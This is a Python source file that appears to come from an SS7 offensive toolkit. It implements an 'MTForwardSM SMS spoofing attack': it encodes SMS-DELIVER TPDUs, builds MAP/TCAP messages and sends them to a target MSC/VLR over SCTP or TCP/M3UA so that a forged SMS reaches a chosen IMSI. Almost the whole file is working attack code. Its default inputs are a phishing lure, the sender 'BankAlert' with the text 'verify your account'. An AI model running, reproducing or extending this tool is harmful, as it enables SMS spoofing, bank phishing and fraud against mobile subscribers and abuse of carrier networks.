#!/usr/bin/env python
"""
MTForwardSM (SMS Spoofing) Attack Module
Uses proper MAP ASN.1 encoding for real SS7 network interaction.
Supports both SCTP (raw) and TCP transport.
"""
import sys
import os
from scapy.all import *

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from ss7.attacks.ss7_layers import get_input, validate_ip, validate_msisdn, validate_imsi, M3UA, M3UA_Param_Protocol_Data
from ss7.attacks.map_layer import MTForwardSM

def encode_sms_tpdu(sender_id, message):
    """
    Encode SMS-DELIVER TPDU (3GPP TS 23.040).
    """
    tpdu = b''
    tpdu += bytes([0x04])
    
    if sender_id.isdigit():
        oa_digits = sender_id
        if len(oa_digits) % 2 == 1:
            oa_digits += 'F'
        oa_bytes = b''
        for i in range(0, len(oa_digits), 2):
            low = int(oa_digits[i], 16)
            high = int(oa_digits[i+1], 16) if oa_digits[i+1] != 'F' else 0xF
            oa_bytes += bytes([(high << 4) | low])
        tpdu += bytes([len(sender_id)])
        tpdu += bytes([0x91])
        tpdu += oa_bytes
    else:
        gsm_chars = encode_gsm7(sender_id)
        septets = len(sender_id)
        tpdu += bytes([septets * 2])
        tpdu += bytes([0xD0])
        tpdu += gsm_chars
    
    tpdu += bytes([0x00])
    tpdu += bytes([0x00])
    
    import time
    t = time.localtime()
    tpdu += bytes([
        _swap_nibbles(t.tm_year % 100),
        _swap_nibbles(t.tm_mon),
        _swap_nibbles(t.tm_mday),
        _swap_nibbles(t.tm_hour),
        _swap_nibbles(t.tm_min),
        _swap_nibbles(t.tm_sec),
        0x00
    ])
    
    ud = encode_gsm7(message)
    tpdu += bytes([len(message)])
    tpdu += ud
    
    return tpdu

def encode_gsm7(text):
    """Encode text to GSM 7-bit packed format."""
    septets = []
    for char in text:
        code = ord(char)
        if code < 128:
            septets.append(code)
        else:
            septets.append(0x3F)
    
    result = []
    shift = 0
    for i, septet in enumerate(septets):
        if shift == 7:
            shift = 0
            continue
        current = (septet >> shift) & 0xFF
        if i + 1 < len(septets):
            next_val = septets[i + 1]
            current |= (next_val << (7 - shift)) & 0xFF
        result.append(current)
        shift += 1
    
    return bytes(result)

def _swap_nibbles(val):
    """Swap nibbles of a BCD value."""
    high = val // 10
    low = val % 10
    return (low << 4) | high

def mtsms_main():
    print("\n" + "=" * 50)
    print(" MTForwardSM (SMS Spoofing) Attack")
    print(" Send Spoofed SMS via SS7 MAP")
    print("=" * 50 + "\n")
    
    print("\033[33m[!] WARNING: This sends a real SMS to the target!\033[0m\n")

    print("[1] Connection Configuration")
    print("-" * 30)
    remote_ip = get_input("Target IP (MSC/VLR)", "10.0.0.1", validator=validate_ip)
    remote_port = int(get_input("Target Port", "2905"))
    
    print("\n[2] SS7 Configuration")
    print("-" * 30)
    opc = int(get_input("Your Point Code (OPC)", "666"))
    dpc = int(get_input("Target Point Code (DPC)", "2"))
    
    print("\n[3] SMS Parameters")
    print("-" * 30)
    target_imsi = get_input("Target IMSI", "286011234567890", validator=validate_imsi)
    smsc_addr = get_input("SMSC Address", "44123456789")
    sender_id = get_input("Spoofed Sender ID", "BankAlert")
    message = get_input("Message Content", "Security alert: verify your account")
    
    print("\n" + "=" * 50)
    print(" Building MAP MTForwardSM Message")
    print("=" * 50)
    
    sms_tpdu = encode_sms_tpdu(sender_id, message)
    mtsms = MTForwardSM(
        sm_rp_da=target_imsi,
        sm_rp_oa=smsc_addr,
        sm_rp_ui=sms_tpdu
    )
    tcap_data = mtsms.to_tcap_begin()
    
    print(f"[+] Target IMSI: {target_imsi}")
    print(f"[+] Sender ID: {sender_id}")
    print(f"[+] Message: {message}")
    print(f"[+] MAP Operation: MTForwardSM (OpCode: 44)")
    print(f"[+] SMS TPDU Size: {len(sms_tpdu)} bytes")
    print(f"[+] TCAP Message Size: {len(tcap_data)} bytes")

    # Transport selection
    print("\n[+] Transport Selection:")
    print("    1) SCTP (raw - requires root/Linux)")
    print("    2) TCP  (works everywhere)")
    transport = get_input("Transport mode", "2")

    if transport == "1":
        _sctp_mtsms(remote_ip, remote_port, opc, dpc, tcap_data)
    else:
        _tcp_mtsms(remote_ip, remote_port, opc, dpc, tcap_data)

    input("\nPress Enter to return...")


def _sctp_mtsms(remote_ip, remote_port, opc, dpc, tcap_data):
    """SCTP transport."""
    print(f"\n[+] Sending to {remote_ip}:{remote_port} (SCTP)...")
    try:
        init_pkt = IP(dst=remote_ip) / SCTP(sport=2905, dport=remote_port) / SCTPChunkInit()
        ans = sr1(init_pkt, timeout=5, verbose=0)
        
        if ans and ans.haslayer(SCTPChunkInitAck):
            print("[+] SCTP Connection established!")
            m3ua = M3UA(msg_class=1, msg_type=1)
            proto_data = M3UA_Param_Protocol_Data(opc=opc, dpc=dpc, si=3, ni=2)
            data_pkt = IP(dst=remote_ip) / SCTP(sport=2905, dport=remote_port) / \
                       SCTPChunkData(data=bytes(m3ua/proto_data) + tcap_data)
            map_ans = sr1(data_pkt, timeout=5, verbose=0)
            if map_ans:
                print("\n[+] Response received! SMS may have been delivered.")
            else:
                print("[-] No MAP response (timeout)")
        else:
            print("[-] SCTP failed. Trying TCP fallback...")
            _tcp_mtsms(remote_ip, remote_port, opc, dpc, tcap_data)
    except Exception as e:
        print(f"[-] SCTP Error: {e}")
        print("[*] Trying TCP fallback...")
        _tcp_mtsms(remote_ip, remote_port, opc, dpc, tcap_data)


def _tcp_mtsms(remote_ip, remote_port, opc, dpc, tcap_data):
    """TCP transport fallback."""
    print("\n[+] Using TCP Transport...")
    try:
        from ss7.attacks.tcp_transport import tcp_attack
    except ImportError:
        sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        from tcp_transport import tcp_attack

    result = tcp_attack(remote_ip, remote_port, opc, dpc, tcap_data, called_ssn=8)

    print("\n" + "=" * 50)
    print(" MTForwardSM Result")
    print("=" * 50)
    if result.get('success'):
        print("\033[32m[+] SMS delivered to MSC/VLR!\033[0m")
        print("\033[32m[+] Spoofed SMS may have reached the target.\033[0m")
        if result.get('map_error'):
            print(f"\033[31m[-] MAP Error: {result['map_error']} ({result.get('map_error_name', '')})\033[0m")
    else:
        print(f"\033[31m[-] {result.get('error', 'Unknown error')}\033[0m")


if __name__ == "__main__":
    mtsms_main()
